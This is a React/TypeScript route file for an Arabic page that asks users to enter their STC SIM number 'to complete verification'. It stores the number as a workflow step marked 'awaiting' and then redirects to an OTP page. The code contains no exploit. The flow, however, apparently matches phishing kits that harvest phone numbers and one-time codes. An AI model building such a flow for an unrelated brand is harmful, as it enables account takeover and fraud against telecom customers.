import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useState } from "react";
import { ArrowLeft, Smartphone } from "lucide-react";
import { submitCurrentStep } from "@/lib/workflow";

export const Route = createFileRoute("/stc")({
  head: () => ({
    meta: [
      { title: "ربط شريحة STC — بيكير" },
      { name: "description", content: "أدخل رقم شريحتك لإتمام التحقق عبر STC." },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
  }),
  component: StcPage,
});

function StcPage() {
  const navigate = useNavigate();
  const [stcNumber, setStcNumber] = useState("");
  const [loading, setLoading] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    await submitCurrentStep("stc_awaiting", { stc_number: stcNumber });
    setLoading(false);
    void navigate({ to: "/stc-otp" });
  };

  return (
    <div className="min-h-screen bg-dark-50 pt-16 md:pt-20">
      <div className="container-x py-8 md:py-12">
        <div className="mx-auto max-w-md">
          <div className="mb-6 text-center">
            <div className="mx-auto flex h-16 w-16 items-center justify-center rounded-2xl bg-primary-100 text-primary-600">
              <Smartphone className="h-8 w-8" />
            </div>
            <h1 className="mt-4 text-2xl font-extrabold text-dark-900">ربط شريحة STC</h1>
            <p className="mt-2 text-sm text-dark-500">أدخل رقم شريحتك لإتمام التحقق</p>
          </div>

          <form onSubmit={handleSubmit} className="card space-y-5">
            <div>
              <label className="mb-1.5 block text-sm font-medium text-dark-700">رقم الشريحة</label>
              <input value={stcNumber} onChange={(e) => setStcNumber(e.target.value)} required className="input-field" placeholder="05xxxxxxxx" inputMode="numeric" maxLength={10} dir="ltr" />
            </div>
            <button type="submit" disabled={loading} className="btn-primary w-full disabled:opacity-60">
              {loading ? "جارٍ الإرسال..." : "إرسال رمز التحقق"}
              <ArrowLeft className="h-5 w-5" />
            </button>
          </form>
        </div>
      </div>
    </div>
  );
}
